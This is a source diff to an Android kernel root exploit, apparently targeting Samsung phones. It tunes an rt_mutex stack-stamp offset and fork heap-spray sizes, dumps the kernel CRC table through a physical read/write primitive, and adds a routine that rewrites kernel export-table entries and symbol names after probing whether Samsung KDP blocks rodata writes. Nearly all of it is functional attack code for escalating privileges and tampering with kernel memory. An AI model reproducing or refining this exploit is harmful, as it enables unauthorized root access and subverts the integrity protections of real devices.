@@ -1,0 +1,399 @@
+diff --git a/Makefile b/Makefile
+index 99aa41f..378dfe7 100644
+--- a/Makefile
++++ b/Makefile
+@@ -42,7 +42,7 @@ BUILDROOT_SYSROOT := $(BUILDROOT_DIR)/aarch64-buildroot-linux-gnu/sysroot
+ 
+ DEFAULT_NDK_ROOT := $(or $(wildcard $(HOME)/Android/Sdk/ndk/27.2.12479018),$(HOME)/android-ndk-cache/android-ndk-r29)
+ NDK_ROOT ?= $(or $(ANDROID_NDK_HOME),$(ANDROID_NDK_ROOT),$(DEFAULT_NDK_ROOT))
+-NDK_TOOLCHAIN ?= $(if $(NDK_ROOT),$(NDK_ROOT)/toolchains/llvm/prebuilt/linux-x86_64)
++NDK_TOOLCHAIN ?= $(if $(NDK_ROOT),$(NDK_ROOT)/toolchains/llvm/prebuilt/$(shell ls $(NDK_ROOT)/toolchains/llvm/prebuilt/ | head -1))
+ NDK_CC := $(NDK_TOOLCHAIN)/bin/aarch64-linux-android$(API)-clang
+ HOST_CLANG ?= clang
+ SYSROOT ?= $(if $(NDK_TOOLCHAIN),$(NDK_TOOLCHAIN)/sysroot)
+diff --git a/src/common.h b/src/common.h
+index e22dcae..10bdebc 100644
+--- a/src/common.h
++++ b/src/common.h
+@@ -406,3 +406,6 @@ int install_pipe_physrw(int fd);
+ int install_android_root(int fd);
+ 
+ #endif
++
++/* root.c */
++void dump_kcrctab(int fd);
+diff --git a/src/exp32/stack.c b/src/exp32/stack.c
+index c41eef1..b60c7d3 100644
+--- a/src/exp32/stack.c
++++ b/src/exp32/stack.c
+@@ -55,8 +55,11 @@
+ 
+ extern atomic_int g_consumer_go;
+ 
+-/* b0q: stale rt_waiter lands at stamp-buffer +0x58 (live-measured). */
++/* b0q: stale rt_waiter lands at stamp-buffer +0x58 (live-measured).
++ * q4q: TBD — 环境变量 EXP32_STAMP_OFF 可覆盖扫描 (eureka=0x34, b0q=0x58) */
++#ifndef EXP32_STAMP_OFF
+ #define EXP32_STAMP_OFF 0x58
++#endif
+ /* v5.10 rt_mutex_waiter = 80 bytes */
+ #define EXP32_WAITER_BYTES 0x50
+ /* Enough stamps to be sure the full payload is what the last completed
+@@ -70,7 +73,20 @@ void do_stamp_stack(uint64_t *buf){
+         pr_warning("do_stamp_stack: socket failed errno=%d\n", errno);
+         _exit(1);   /* let the parent retry with a fresh child */
+     }
+-    memcpy(buffer + EXP32_STAMP_OFF, buf, EXP32_WAITER_BYTES);
++    int stamp_off = EXP32_STAMP_OFF;
++    const char *env_off = getenv("EXP32_STAMP_OFF");
++    if (env_off && *env_off) {
++        char *end = NULL;
++        long v = strtol(env_off, &end, 0);
++        if (!errno && end != env_off && !*end && v >= 0 && v <= 200) {
++            stamp_off = (int)v;
++        }
++    }
++    if (stamp_off + EXP32_WAITER_BYTES > (int)sizeof(buffer)) {
++        pr_warning("do_stamp_stack: stamp_off=%d too large\n", stamp_off);
++        _exit(1);
++    }
++    memcpy(buffer + stamp_off, buf, EXP32_WAITER_BYTES);
+ 
+     /*
+      * Probe ONE stamp and report it BEFORE the real loop.  After the last
+diff --git a/src/fops.c b/src/fops.c
+index 4e56c0a..bf6d32e 100644
+--- a/src/fops.c
++++ b/src/fops.c
+@@ -103,7 +103,18 @@ int restore_slide_boot_id(int fd) {
+ }
+ 
+ int install_child_root(int fd) {
+-  return install_pipe_physrw(fd) && install_android_root(fd);
++  if (!install_pipe_physrw(fd)) {
++    return 0;
++  }
++  /* dump kcrctab only when explicitly asked: 32768 single-byte reads
++   * take minutes and starve the LD_PRELOAD host budget.  The device
++   * kcrctab is a fixed kernel-image table — we already captured the
++   * full 32768-byte dump (kcrctab-device-full.bin); fake exports are
++   * the only step that must run on every boot. */
++  if (getenv("DUMP_KCRCTAB")) {
++    dump_kcrctab(fd);
++  }
++  return install_android_root(fd);
+ }
+ 
+ int try_cfi_stage(void) {
+diff --git a/src/kernelsnitch/futex_hash.h b/src/kernelsnitch/futex_hash.h
+index 515f6b1..6545cbf 100644
+--- a/src/kernelsnitch/futex_hash.h
++++ b/src/kernelsnitch/futex_hash.h
+@@ -202,7 +202,14 @@ uint32_t __futex_hash(futex_key_t *key, uint32_t futex_hashsize)
+ unsigned long futex_hashsize = (unsigned long)-1;
+ void futex_init(void)
+ {
+-    futex_hashsize = SYSCHK(sysconf(_SC_NPROCESSORS_ONLN) * 256);
++#ifdef KERNELSNITCH_FUTEX_HASH_SIZE
++    futex_hashsize = KERNELSNITCH_FUTEX_HASH_SIZE;
++#else
++    unsigned long requested = SYSCHK(sysconf(_SC_NPROCESSORS_ONLN)) * 256;
++    futex_hashsize = 1;
++    while (futex_hashsize < requested)
++        futex_hashsize <<= 1;
++#endif
+ }
+ uint32_t futex_hash(size_t addr, size_t mm)
+ {
+diff --git a/src/kernelsnitch/kernelsnitch.h b/src/kernelsnitch/kernelsnitch.h
+index 4d5c756..81e25f0 100644
+--- a/src/kernelsnitch/kernelsnitch.h
++++ b/src/kernelsnitch/kernelsnitch.h
+@@ -22,7 +22,7 @@
+ #ifndef KS_PAGE_SIZE
+ #define KS_PAGE_SIZE PAGE_SIZE
+ #endif
+-#define APPENDED_FUTEXES 4096
++#define APPENDED_FUTEXES 1024
+ #define MULITPLE 4
+ #ifndef KERNELSNITCH_IDENTITY_START
+ #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
+diff --git a/src/main.c b/src/main.c
+index d0ef168..5a9053a 100644
+--- a/src/main.c
++++ b/src/main.c
+@@ -139,6 +139,22 @@ void run_main_route_threads(void) {
+   }
+ }
+ 
++static void *watchdog_thread(void *arg) {
++  long secs = (long)arg;
++  struct timespec ts = {
++    .tv_sec = secs,
++    .tv_nsec = 0,
++  };
++  nanosleep(&ts, NULL);
++  /* Still here after the budget: the exploit attempt is stuck (exp32
++   * deadlock etc.).  Dump a marker and force-exit so the preload
++   * supervisor can start a fresh attempt process. */
++  pr_error("watchdog: exploit attempt stuck, force-exiting after %lds\n",
++           secs);
++  _exit(124);
++  return NULL;
++}
++
+ static pid_t spawn_allocation_keeper(void) {
+   pid_t child = SYSCHK(fork());
+   if (child != 0) {
+@@ -181,6 +197,7 @@ int run_exploit(int argc, char **argv) {
+ 
+   disable_rseq_for_thread();
+   set_limit();
++  set_unbuffer();
+   log_startup_context();
+   init_ashmem_path();
+ 
+@@ -197,6 +214,11 @@ int run_exploit(int argc, char **argv) {
+ 
+   pin_to_core(CORE);
+ 
++  /* NOTE: no watchdog thread here — a background thread created before
++   * fork() corrupts the child's stdio lock state (exp32 subprocess hangs
++   * on its first printf after execl).  Deadlock protection is provided
++   * by the launch wrapper's log-growth stall detection instead. */
++
+   run_main_route_threads();
+ 
+   pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
+diff --git a/src/pipe.c b/src/pipe.c
+index f28854d..efbc3d5 100644
+--- a/src/pipe.c
++++ b/src/pipe.c
+@@ -122,7 +122,9 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
+   struct mm_ctx post;
+   size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+ 
+-  init_ctx(&prep, 32 * objs_per_slab);
++  /* fork scale halved (16 groups) to survive the phys step's SECOND full
++   * mm-leak pass without tripping LMK (see prepare_ctxs). */
++  init_ctx(&prep, 16 * objs_per_slab);
+   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
+   init_ctx(&pre, objs_per_slab - 1);
+   init_ctx(&post, objs_per_slab);
+diff --git a/src/root.c b/src/root.c
+index b31d0ce..1e09435 100644
+--- a/src/root.c
++++ b/src/root.c
+@@ -1,6 +1,9 @@
+ #include "common.h"
++#include "fake_exports.h"
+ 
+ #include <stdlib.h>
++#include <fcntl.h>
++#include <unistd.h>
+ #include <sys/un.h>
+ 
+ int root_child_done;
+@@ -71,6 +74,167 @@ static int root_write32(int fd, uintptr_t target, uint32_t value) {
+   return root_write_data(fd, target, &value, sizeof(value));
+ }
+ 
++/* KCRCTAB_OFF: device link-time offset of __start___kcrctab relative to
++ * KIMAGE_TEXT_BASE (measured from kallsyms on F9360ZCSAIZF1 boot, slide
++ * subtracted).  kcrctab holds the modversions CRC table, one u32 per
++ * exported symbol in __ksymtab order. */
++#define KCRCTAB_OFF 0x2217904ULL
++
++void dump_kcrctab(int fd) {
++  /* sanity: read selinux enforcing byte (known 0 while permissive) */
++  uint8_t enf = 0xff;
++  ssize_t enf_got =
++      root_read_data(fd, data_addr(SELINUX_ENFORCING), &enf, sizeof(enf));
++  pr_info("kcrctab enf probe got=%zd val=%u\n", enf_got, enf);
++  /* read 16 bytes around enforcing: real kernel .data reads back as
++   * structured values, ashmem-shm reads back as blob/marker bytes */
++  uint8_t enf16[16];
++  memset(enf16, 0xcc, sizeof(enf16));
++  uintptr_t enf_base = data_addr(SELINUX_ENFORCING) & ~(PAGE_SIZE - 1);
++  ssize_t e16 = root_read_data(fd, enf_base, enf16, sizeof(enf16));
++  pr_info("kcrctab enf16 got=%zd %02x %02x %02x %02x %02x %02x %02x %02x\n",
++          e16, enf16[0], enf16[1], enf16[2], enf16[3], enf16[4], enf16[5],
++          enf16[6], enf16[7]);
++
++  uintptr_t kcrctab = data_addr(KIMAGE_TEXT_BASE + KCRCTAB_OFF);
++  /* pipe_phys_read returns at most 1 byte on this device (pb.len not
++   * honoured): read byte by byte.  0x8000 = 32768 single-byte reads covers
++   * __kcrctab (2857 crcs) + __kcrctab_gpl (4398 crcs) = 7255 u32 total. */
++  uint8_t buf[0x8000];
++  size_t got_total = 0;
++  for (size_t i = 0; i < sizeof(buf); i++) {
++    uint8_t b = 0;
++    if (root_read_data(fd, kcrctab + i, &b, 1) != 1) {
++      pr_info("kcrctab dump byte %zu failed\n", i);
++      return;
++    }
++    buf[i] = b;
++    got_total++;
++  }
++  pr_info("kcrctab dump %zu bytes from %lx\n", got_total, kcrctab);
++  int out = open("/data/local/tmp/kcrctab.bin",
++                 O_WRONLY | O_CREAT | O_TRUNC, 0644);
++  if (out >= 0) {
++    ssize_t w = write(out, buf, sizeof(buf));
++    pr_info("kcrctab saved %zd bytes\n", w);
++    close(out);
++  }
++}
++
++/* ---- fake exports: hijack cold __ksymtab entries to resolve
++ * TRIM_UNUSED_KSYMS-stripped symbols at find_symbol() time.
++ * kernel_symbol (PREL32): { int value_offset; int name_offset;
++ * int namespace_offset; } — 12 bytes.  name_offset points at the
++ * NUL-terminated name string (usually in __ksymtab_strings).
++ * We rewrite a victim entry's value_offset to point at the real
++ * target symbol and overwrite the victim's name string in place
++ * (victim names are longer than target names, guaranteed by
++ * select-victims.py).  The runtime delta is slide-invariant:
++ * (target+slide)-(entry+slide) == target-entry. */
++void fake_exports_patch(int fd) {
++  int ok_count = 0;
++  for (size_t i = 0; i < FAKE_EXPORTS_N; i++) {
++    uintptr_t entry = fake_exports[i].victim_entry;
++    uintptr_t target = fake_exports[i].target_addr;
++
++    /* victim entry lives in the kernel image; convert link-time image
++     * address to runtime via data_addr() (same as kcrctab). */
++    uintptr_t entry_rt = data_addr(entry);
++
++    /* read current victim entry (12 bytes) — byte by byte: pipe_phys_read
++     * returns at most 1 byte on this device (pb.len not honoured). */
++    uint8_t raw[12];
++    int read_ok = 1;
++    for (size_t j = 0; j < sizeof(raw); j++) {
++      uint8_t b = 0;
++      if (root_read_data(fd, entry_rt + j, &b, 1) != 1) {
++        read_ok = 0;
++        break;
++      }
++      raw[j] = b;
++    }
++    if (!read_ok) {
++      pr_info("fake_export[%zu] read entry failed\n", i);
++      continue;
++    }
++    int32_t name_off;
++    memcpy(&name_off, raw + 4, sizeof(name_off));
++    int32_t ns_off;
++    memcpy(&ns_off, raw + 8, sizeof(ns_off));
++
++    /* name string address: PREL32 name_offset is relative to the NAME
++     * FIELD itself (entry+4), not the entry start — Samsung export.h:
++     * ".long __kstrtab_##sym - ." where '.' is the name field position. */
++    uintptr_t name_rt = data_addr((uintptr_t)((int64_t)entry + 4 + name_off));
++
++    /* KDP/RKP probe: rodata (__ksymtab_strings) writes may panic on
++     * Samsung KDP.  Try a single byte write+readback on the victim name
++     * string; abort the whole fake-export if it does not stick. */
++    uint8_t first = 0;
++    if (root_read_data(fd, name_rt, &first, 1) != 1) {
++      pr_info("fake_export[%zu] name probe read failed\n", i);
++      continue;
++    }
++    uint8_t flip = (uint8_t)(first ^ 0x5a);
++    if (root_write_data(fd, name_rt, &flip, 1) != 1) {
++      pr_info("fake_export[%zu] name probe write failed\n", i);
++      continue;
++    }
++    uint8_t back = 0;
++    root_read_data(fd, name_rt, &back, 1);
++    if (back != flip) {
++      pr_info("fake_export[%zu] KDP BLOCKED rodata write (got %02x want %02x)\n",
++              i, back, flip);
++      return;  /* do not touch the rest: Samsung KDP would panic */
++    }
++    /* restore original byte */
++    root_write_data(fd, name_rt, &first, 1);
++    pr_info("fake_export[%zu] rodata writable probe OK\n", i);
++
++    /* overwrite name string with target name (victim name is longer);
++     * byte by byte, same 1-byte limitation. */
++    const char *tgt_name = fake_export_names[i];
++    size_t tlen = strlen(tgt_name) + 1;
++    int name_ok = 1;
++    for (size_t j = 0; j < tlen; j++) {
++      if (root_write_data(fd, name_rt + j, &tgt_name[j], 1) != 1) {
++        name_ok = 0;
++        break;
++      }
++    }
++    if (!name_ok) {
++      pr_info("fake_export[%zu] name write failed\n", i);
++      continue;
++    }
++
++    /* new value_offset = target - entry (PREL32, slide-invariant) */
++    int64_t diff = (int64_t)target - (int64_t)entry;
++    if (diff < INT32_MIN || diff > INT32_MAX) {
++      pr_info("fake_export[%zu] delta %lld out of range\n", i, diff);
++      continue;
++    }
++    int32_t new_val = (int32_t)diff;
++    memcpy(raw, &new_val, sizeof(new_val));
++    /* keep name_offset/namespace_offset as-is; write back byte by byte */
++    int write_ok = 1;
++    for (size_t j = 0; j < sizeof(raw); j++) {
++      if (root_write_data(fd, entry_rt + j, &raw[j], 1) != 1) {
++        write_ok = 0;
++        break;
++      }
++    }
++    if (!write_ok) {
++      pr_info("fake_export[%zu] entry write failed\n", i);
++      continue;
++    }
++    ok_count++;
++    pr_info("fake_export[%zu] %s -> %s (entry=%zx diff=%d)\n", i,
++            fake_export_names[i], fake_export_victims[i], entry_rt,
++            new_val);
++  }
++  pr_info("fake_exports done %d/%d\n", ok_count, (int)FAKE_EXPORTS_N);
++}
++
+ static int wake_system_unbound(void) {
+   char slave_name[128];
+   int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
+@@ -290,5 +454,17 @@ static int install_workqueue_umh_root(int fd) {
+ int install_android_root(int fd) {
+   root_uid_before = getuid();
+   pr_info("root direct start uid=%u fd=%d\n", root_uid_before, fd);
+-  return install_workqueue_umh_root(fd);
++  int ok = install_workqueue_umh_root(fd);
++  /* NOTE: dump_kcrctab already ran in fops.c right after physrw
++   * verification — running it again here costs 32768 single-byte reads
++   * (~minutes) and starves the LD_PRELOAD host's 180s budget.  Only the
++   * fake-export patch runs post-root.
++   * KSU_LOAD_ONLY: the KDP-patched ko (kernelsu-kdp.ko) has a ZERO-length
++   * __versions section and is loaded via ksu-load (kallsyms manual
++   * relocation) — fake exports are obsolete and risky (kernel export-table
++   * rewrite under KDP), so skip them entirely. */
++  if (!getenv("KSU_LOAD_ONLY")) {
++    fake_exports_patch(fd);
++  }
++  return ok;
+ }
+diff --git a/src/util.c b/src/util.c
+index c6dcd3d..4789625 100644
+--- a/src/util.c
++++ b/src/util.c
+@@ -959,7 +959,10 @@ static void abort_prepare_kernel_page(void) {
+ }
+ 
+ void prepare_ctxs(void) {
+-  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
++  /* fork scale: 32 groups of mm_structs + 4096 collision threads blew past
++   * the device's task/memory budget on the second (phys step) pass and got
++   * LMK-killed (supervisor died mid-physrw).  Halved to 16 groups. */
++  prepare_ctx.mm_cnt = 16 * mm_objs_per_slab;
+   prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
+   prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
+ 
